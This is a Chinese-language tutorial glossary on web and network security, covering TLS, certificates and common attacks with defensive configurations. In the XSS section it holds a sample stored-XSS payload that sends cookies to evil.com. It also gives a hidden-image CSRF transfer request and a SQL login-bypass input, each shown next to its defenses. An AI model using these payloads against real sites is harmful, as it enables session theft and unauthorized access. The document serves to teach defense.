# 网络安全篇

网络安全是保护计算机系统和数据免受攻击、未授权访问和破坏的实践。本篇将带你理解 HTTPS、TLS/SSL 握手、常见网络攻击及防御手段。

---

## HTTPS（HyperText Transfer Protocol Secure）

**一句话定义（大白话）**
HTTPS 是 HTTP 的加密版本，在 HTTP 和 TCP 之间加了一层 TLS/SSL 加密层，保证数据传输的安全。

**通俗类比（生活场景）**
像挂号信 vs 平信：普通 HTTP 是明信片，谁都能看内容；HTTPS 是密封的挂号信，只有收件人能拆开。

**具体示例（代码、命令或操作场景）**
```bash
# 检查网站是否使用 HTTPS
curl -I https://example.com
# 响应头包含 Strict-Transport-Security

# 浏览器中：地址栏显示 🔒 图标

# 配置 HTTPS（Nginx 示例）
server {
    listen 443 ssl;
    server_name example.com;
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
}

# HTTP 强制跳转 HTTPS
server {
    listen 80;
    server_name example.com;
    return 301 https://$server_name$request_uri;
}
```

**为什么需要它（解决什么问题）**
保护数据传输安全：防止窃听、篡改、中间人攻击。是现代网站的标配。

**与相关术语的对比和区分**
- HTTPS vs HTTP：HTTPS = HTTP + TLS 加密
- HTTPS vs SSL：SSL 是 TLS 的前身，现在统一用 TLS
- HTTPS 默认端口 443，HTTP 默认端口 80

## TLS/SSL 握手过程

**一句话定义（大白话）**
TLS 握手是客户端和服务器在建立安全连接前的一系列消息交换过程，用于协商加密算法、交换密钥、验证身份。

**通俗类比（生活场景）**
像两个人见面确认身份：先打招呼（ClientHello）、交换名片（证书）、确认暗号（密钥交换）、开始加密交谈。

**具体示例（代码、命令或操作场景）**
```
TLS 1.3 握手流程（简化）：

1. ClientHello（客户端）
   - 支持的 TLS 版本
   - 支持的加密套件列表
   - 客户端随机数
   - 扩展（如 SNI）

2. ServerHello（服务器）
   - 选定的 TLS 版本
   - 选定的加密套件
   - 服务器随机数
   - 服务器证书
   - 服务器密钥交换（如有）

3. 验证证书（客户端）
   - 检查证书是否由可信 CA 签发
   - 检查证书是否过期
   - 检查域名是否匹配

4. 密钥交换（双方）
   - 使用 ECDHE 生成临时密钥对
   - 交换公钥
   - 各自计算出相同的预主密钥

5. Finished（双方）
   - 用协商好的密钥加密 finished 消息
   - 验证握手完整性
   - 开始加密通信

# 查看握手过程
openssl s_client -connect example.com:443 -debug
```

**为什么需要它（解决什么问题）**
建立安全通信通道，确保数据的机密性、完整性和身份认证。

**与相关术语的对比和区分**
- TLS 1.2 vs TLS 1.3：1.3 更快更安全，减少了握手往返
- SSL 2.0/3.0 已不安全，被禁用
- 完整握手需要 1-2 个往返（TLS 1.3 只需 1 个）

## 数字证书（Digital Certificate）

**一句话定义（大白话）**
数字证书是由证书颁发机构（CA）签发的电子文档，用于证明公钥持有者的身份。

**通俗类比（生活场景）**
像身份证：由公安局（CA）签发，证明你（公钥持有者）是谁，别人可以验证你的身份。

**具体示例（代码、命令或操作场景）**
```bash
# 查看网站证书
openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -text -noout

# 证书内容包括：
# - 主题（Subject）：证书持有者信息
# - 颁发者（Issuer）：签发证书的 CA
# - 有效期：notBefore 和 notAfter
# - 公钥：证书持有者的公钥
# - 签名：CA 对证书的数字签名

# 生成自签名证书（开发用）
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout server.key -out server.crt

# 查看证书链
openssl s_client -connect example.com:443 -showcerts
```

**为什么需要它（解决什么问题）**
验证服务器身份、建立 TLS 加密连接、代码签名、邮件加密。

**与相关术语的对比和区分**
- 数字证书 vs 数字签名：证书包含公钥，签名验证数据完整性
- 数字证书 vs CA：CA 是签发机构，证书是签发的文档
- X.509 是数字证书的标准格式

## 数字签名（Digital Signature）

**一句话定义（大白话）**
数字签名是用私钥加密的数据摘要，任何人可以用公钥验证签名，确保数据的完整性和来源真实性。

**通俗类比（生活场景）**
像亲笔签名 + 公章：你用私钥（你的印章）盖章，别人用公钥（验证章）可以确认是你签的，而且内容没被改过。

**具体示例（代码、命令或操作场景）**
```python
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes

# 生成密钥对
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# 签名
message = b"Important document content"
signature = private_key.sign(
    message,
    padding.PSS(mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH),
    hashes.SHA256()
)
print(f"签名: {signature.hex()[:64]}...")

# 验证签名
try:
    public_key.verify(
        signature,
        message,
        padding.PSS(mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH),
        hashes.SHA256()
    )
    print("签名有效！数据未被篡改。")
except:
    print("签名无效！数据可能被篡改。")
```

```bash
# OpenSSL 生成和验证签名
# 签名
openssl dgst -sha256 -sign private.pem -out signature.bin document.txt

# 验证
openssl dgst -sha256 -verify public.pem -signature signature.bin document.txt
```

**为什么需要它（解决什么问题）**
代码签名、文档认证、SSL/TLS 证书验证、区块链交易验证。

**与相关术语的对比和区分**
- 数字签名 vs HMAC：签名用非对称密钥，HMAC 用对称密钥
- 数字签名 vs 加密：签名保证完整性和身份，加密保证保密性
- 数字签名用私钥签名，公钥验证

## CA 机构（Certificate Authority）

**一句话定义（大白话）**
CA 是受信任的证书颁发机构，负责签发和管理数字证书，是 PKI 体系的核心。

**通俗类比（生活场景）**
像国家认证机构：只有他们签发的证书（如营业执照）才被社会认可和信任。

**具体示例（代码、命令或操作场景）**
```
主要 CA 机构：
- Let's Encrypt：免费、自动化、全球信任
- DigiCert：商业 CA，高端证书
- Comodo / Sectigo：市场份额最大的商业 CA
- GlobalSign：企业级 CA
- 中国：CFCA（中国金融认证中心）、沃通

# Let's Encrypt 免费证书申请
# 安装 certbot
sudo apt install certbot python3-certbot-nginx

# 申请证书
sudo certbot --nginx -d example.com -d www.example.com

# 自动续期
sudo certbot renew

# 证书链验证
openssl s_client -connect example.com:443 -CAfile /etc/ssl/certs/ca-certificates.crt
```

**为什么需要它（解决什么问题）**
建立信任链：浏览器和操作系统内置了可信 CA 列表，自动验证网站身份。

**与相关术语的对比和区分**
- CA vs 自签名证书：CA 证书被浏览器信任，自签名证书会弹出警告
- 根 CA vs 中间 CA：根 CA 签发中间 CA，中间 CA 签发终端证书
- 证书透明度（CT）：记录所有签发的证书，防止 CA 滥权

## 中间人攻击（Man-in-the-Middle Attack, MITM）

**一句话定义（大白话）**
中间人攻击是攻击者秘密插入通信双方之间，拦截、篡改或窃听通信内容。

**通俗类比（生活场景）**
像有人假装成邮递员，拦截你的信件，看完内容后再转交给收件人，双方都不知道被拦截了。

**具体示例（代码、命令或操作场景）**
```
中间人攻击场景：

1. ARP 欺骗（局域网）
   攻击者发送伪造的 ARP 响应，将流量重定向到自己
   防御：使用静态 ARP 表、启用 ARP 检测

2. DNS 劫持
   攻击者篡改 DNS 解析，将域名指向恶意服务器
   防御：使用 DNS over HTTPS (DoH)、DNSSEC

3. SSL 剥离
   攻击者将 HTTPS 降级为 HTTP
   防御：启用 HSTS 头

4. Wi-Fi 窃听
   在公共 Wi-Fi 上监听未加密的通信
   防御：始终使用 VPN 或 HTTPS

# 检测中间人攻击
# 查看证书是否与域名匹配
openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -noout -subject
```

**为什么需要它（解决什么问题）**
理解攻击原理才能有效防御。HTTPS、证书验证、HSTS 都是防御 MITM 的手段。

**与相关术语的对比和区分**
- MITM vs DoS：MITM 是窃听/篡改，DoS 是使服务不可用
- MITM vs Phishing：MITM 是拦截通信，Phishing 是诱骗用户
- MITM vs SSL Stripping：SSL Stripping 是 MITM 的一种具体手法

## XSS（Cross-Site Scripting，跨站脚本攻击）

**一句话定义（大白话）**
XSS 是攻击者将恶意脚本注入到网页中，当其他用户浏览时在他们浏览器中执行。

**通俗类比（生活场景）**
像有人在公共告示栏贴了一张假通知，看起来像官方的，但其实是诈骗信息。

**具体示例（代码、命令或操作场景）**
```
三种 XSS 类型：

1. 存储型 XSS（最危险）
   攻击者提交恶意脚本到数据库（如评论区）
   其他用户查看时自动执行
   
   示例：评论中包含 <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>

2. 反射型 XSS
   恶意脚本在 URL 中，服务器反射到页面
   
   示例：https://example.com/search?q=<script>alert('XSS')</script>

3. DOM 型 XSS
   恶意脚本通过修改 DOM 在客户端执行
   
   示例：document.getElementById('output').innerHTML = location.hash.slice(1)

# 防御措施
# 1. 输入验证
import re
def sanitize_input(text):
    return re.sub(r'<[^>]+>', '', text)

# 2. 输出编码
from markupsafe import escape
safe_output = escape(user_input)

# 3. CSP 头
Content-Security-Policy: default-src 'self'; script-src 'self'
```

**为什么需要它（解决什么问题）**
XSS 是 OWASP Top 10 常见漏洞，可窃取 Cookie、会话劫持、键盘记录。

**与相关术语的对比和区分**
- XSS vs CSRF：XSS 在客户端执行恶意脚本，CSRF 利用用户身份发起请求
- XSS vs SQL 注入：XSS 注入脚本，SQL 注入注入数据库查询
- 防御 XSS 的核心：输入验证 + 输出编码 + CSP

## CSRF（Cross-Site Request Forgery，跨站请求伪造）

**一句话定义（大白话）**
CSRF 是攻击者诱导已登录用户在不知情的情况下，向目标网站发送恶意请求。

**通俗类比（生活场景）**
像有人模仿你的笔迹给你朋友写了一封信，你朋友以为是你写的就照做了。

**具体示例（代码、命令或操作场景）**
```
攻击场景：

1. 用户已登录银行网站（bank.example.com）
2. 用户访问恶意页面（evil.com）
3. 恶意页面包含：
   <img src="https://bank.example.com/transfer?to=attacker&amount=10000" style="display:none">
4. 浏览器自动带上银行网站的 Cookie
5. 银行服务器误以为是用户操作

# 防御措施
# 1. CSRF Token（最有效）
# 在表单中嵌入随机 Token，服务器验证
<form method="POST" action="/transfer">
  <input type="hidden" name="csrf_token" value="随机Token">
  <input type="text" name="amount">
  <button type="submit">转账</button>
</form>

# 2. SameSite Cookie 属性
Set-Cookie: session=abc123; SameSite=Lax; Secure; HttpOnly

# 3. 检查 Referer/Origin 头
if request.headers.get('Origin') != 'https://myapp.com':
    abort(403)
```

**为什么需要它（解决什么问题）**
防止已登录用户被利用执行非预期操作。CSRF Token 和 SameSite Cookie 是主要防御手段。

**与相关术语的对比和区分**
- CSRF vs XSS：CSRF 利用用户身份，XSS 执行恶意脚本
- CSRF 需要用户已登录且有有效 Session
- SameSite=Lax 可防御大部分 CSRF 攻击

## SQL 注入（SQL Injection）

**一句话定义（大白话）**
SQL 注入是攻击者在输入中插入恶意 SQL 代码，欺骗数据库执行非预期操作。

**通俗类比（生活场景）**
像你告诉银行柜员"我要转账给张三，账号 123456"，但柜员没仔细看，把"123456 OR 1=1"也当成了账号的一部分。

**具体示例（代码、命令或操作场景）**
```
# SQL 注入示例
# 用户输入：admin' --
# 生成的查询：
SELECT * FROM users WHERE username='admin' --' AND password='xxx'
# -- 注释掉了密码验证，攻击者无需密码即可登录

# 防御措施
# 1. 参数化查询（最有效）
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s",
    (username, password)  # 参数会被正确转义
)

# 2. ORM 框架
user = User.query.filter_by(username=username, password=password).first()

# 3. 输入验证
if not re.match(r'^[a-zA-Z0-9_]+$', username):
    raise ValueError("用户名包含非法字符")

# 4. 最小权限原则
# 数据库用户只授予必要权限
GRANT SELECT, INSERT ON myapp.* TO 'app_user'@'localhost';
```

**为什么需要它（解决什么问题）**
SQL 注入是 OWASP Top 10 排名第一的漏洞，可导致数据泄露、数据篡改、服务器控制。

**与相关术语的对比和区分**
- SQL 注入 vs XSS：SQL 注入针对数据库，XSS 针对用户浏览器
- SQL 注入 vs NoSQL 注入：原理类似，针对 NoSQL 数据库
- 防御核心：永远不要拼接 SQL 字符串

## DDoS 攻击（Distributed Denial of Service）

**一句话定义（大白话）**
DDoS 是攻击者控制大量计算机（僵尸网络）同时向目标服务器发送请求，使其资源耗尽无法响应正常用户。

**通俗类比（生活场景）**
像一万个人同时打电话订餐，餐厅忙不过来，真正的顾客打不进去了。

**具体示例（代码、命令或操作场景）**
```
DDoS 攻击类型：

1. 流量型攻击（网络层）
   - SYN Flood：发送大量 SYN 包但不完成握手
   - UDP Flood：发送大量 UDP 数据包
   - ICMP Flood：发送大量 ping 请求

2. 应用层攻击（HTTP）
   - HTTP Flood：发送大量 HTTP 请求
   - Slowloris：保持大量半连接消耗连接池
   - CC 攻击：针对动态页面的密集请求

3. 协议攻击
   - Ping of Death：发送超大 ping 包
   - Teardrop：发送畸形数据包碎片

# 防御措施
# 1. CDN 分散流量
# 2. 云防护（阿里云 DDoS 防护、Cloudflare）
# 3. 限流（Rate Limiting）
# 4. WAF 过滤恶意请求
```

**为什么需要它（解决什么问题）**
DDoS 是最常见的网络攻击之一，可导致网站瘫痪、业务中断、经济损失。

**与相关术语的对比和区分**
- DDoS vs DoS：DDoS 来自多个源，DoS 来自单个源
- DDoS vs CC 攻击：CC 攻击是 DDoS 的应用层子类型
- DDoS 防御需要多层防护：网络层 + 应用层 + CDN

## CC 攻击（Challenge Collapsar）

**一句话定义（大白话）**
CC 攻击是针对 Web 应用的 DDoS 攻击，通过大量消耗服务器资源（如数据库查询）使服务不可用。

**通俗类比（生活场景）**
像一群人不停地问图书馆管理员各种问题，管理员忙得无法为真正需要的人服务。

**具体示例（代码、命令或操作场景）**
```
CC 攻击特点：
- 针对 CPU 密集型或数据库密集型页面

- 传统 DDoS 防护可能无效

# Nginx 限流
limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
location /api/ {
    limit_req zone=api burst=20 nodelay;
}

# 2. 验证码
# 触发频率限制后要求输入验证码

# 3. 智能 WAF
# 识别异常请求模式

# 4. 静态化
# 将动态页面缓存为静态页面，减少服务器压力
```

**为什么需要它（解决什么问题）**
CC 攻击成本低、效果好，是中小型网站的常见威胁。

**与相关术语的对比和区分**
- CC 攻击 vs DDoS：CC 是应用层，DDoS 可以是网络层或应用层
- CC 攻击 vs 爬虫：CC 是恶意攻击，爬虫通常有合法目的
- CC 攻击防御重点：限流 + 验证码 + 缓存

## WAF（Web Application Firewall）

**一句话定义（大白话）**
WAF 是专门保护 Web 应用的防火墙，可以识别和拦截恶意 HTTP 请求。

**通俗类比（生活场景）**
像机场安检：检查每个乘客（HTTP 请求）的行李（请求内容），发现违禁品（攻击）就拦截。

**具体示例（代码、命令或操作场景）**
```
WAF 功能：
- SQL 注入防护
- XSS 防护
- 文件上传防护
- 恶意爬虫防护
- CC 攻击防护
- HTTP 协议合规检查

# 云 WAF
# 阿里云 WAF、Cloudflare、ModSecurity

# Nginx + ModSecurity 示例
# 安装 ModSecurity
# 配置 OWASP CRS（核心规则集）
location / {
    modsecurity on;
    modsecurity_rules_file /etc/nginx/modsecurity.conf;
}

# 自定义规则
# 拦截包含 SQL 注入特征的请求
SecRule ARGS "@detectSQLi" "id:1001,phase:1,deny,status:403,msg:'SQL Injection Detected'"

# 拦截包含 XSS 特征的请求
SecRule ARGS "@detectXSS" "id:1002,phase:1,deny,status:403,msg:'XSS Detected'"
```

**为什么需要它（解决什么问题）**
为 Web 应用提供虚拟补丁，在应用层防御各种攻击。是纵深防御的重要一环。

**与相关术语的对比和区分**
- WAF vs 网络防火墙：WAF 防应用层攻击，网络防火墙防网络层攻击
- WAF vs IDS/IPS：WAF 专门针对 Web，IDS/IPS 范围更广
- WAF 不能替代安全编码，但可以提供额外防护

## CORS（Cross-Origin Resource Sharing）

**一句话定义（大白话）**
CORS 是浏览器的安全机制，控制哪些外部网站可以访问你的网站资源。

**通俗类比（生活场景）**
像公司门禁系统：规定哪些外部公司的人可以进入你的办公楼，以及可以去哪些楼层。

**具体示例（代码、命令或操作场景）**
```
# 浏览器同源策略
# https://app.example.com 不能访问 https://api.other.com 的资源
# 除非服务器明确允许

# CORS 响应头
Access-Control-Allow-Origin: https://app.example.com  # 允许的源
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400  # 预检请求缓存时间

# 预检请求（OPTIONS）
# 浏览器发送 OPTIONS 请求检查服务器是否允许
# 服务器响应后浏览器才发送实际请求

# FastAPI 配置 CORS
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware

app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://app.example.com"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
```

**为什么需要它（解决什么问题）**
允许安全的跨域请求，同时防止恶意网站窃取数据。

**与相关术语的对比和区分**
- CORS vs JSONP：CORS 更安全灵活，JSONP 只支持 GET
- CORS vs CSRF：CORS 防跨域数据访问，CSRF 防跨站请求
- 不要设置 `Access-Control-Allow-Origin: *` 配合 `allow_credentials=True`

## CSP（Content Security Policy）

**一句话定义（大白话）**
CSP 是一个 HTTP 安全头，定义了浏览器可以加载哪些资源，有效防御 XSS 和数据注入攻击。

**通俗类比（生活场景）**
像白名单制度：只允许信任的供应商（域名）供货，其他来源一律拒绝。

**具体示例（代码、命令或操作场景）**
```
# CSP 策略示例
Content-Security-Policy: 
  default-src 'self';                    # 默认只允许同源
  script-src 'self' https://cdn.example.com;  # 脚本来源
  style-src 'self' 'unsafe-inline';      # 样式来源
  img-src 'self' data: https:;           # 图片来源
  connect-src 'self' https://api.example.com;  # AJAX 来源
  font-src 'self' https://fonts.example.com;
  object-src 'none';                     # 禁止 Flash 等插件
  frame-ancestors 'none';                # 禁止被 iframe 嵌入
  base-uri 'self';                       # 限制 <base> 标签
  form-action 'self';                    # 限制表单提交

# 报告模式（不拦截，只报告）
Content-Security-Policy-Report-Only: ...
Report-To: {"group":"csp","max_age":10886400,"endpoints":[{"url":"https://example.com/csp-report"}]}
```

**为什么需要它（解决什么问题）**
深度防御 XSS 攻击，即使输入验证失败，CSP 也能阻止恶意脚本执行。

**与相关术语的对比和区分**
- CSP vs WAF：CSP 在浏览器端执行，WAF 在服务器端拦截
- CSP vs 输入验证：CSP 是最后一道防线，输入验证是第一道
- CSP 报告模式可用于逐步部署
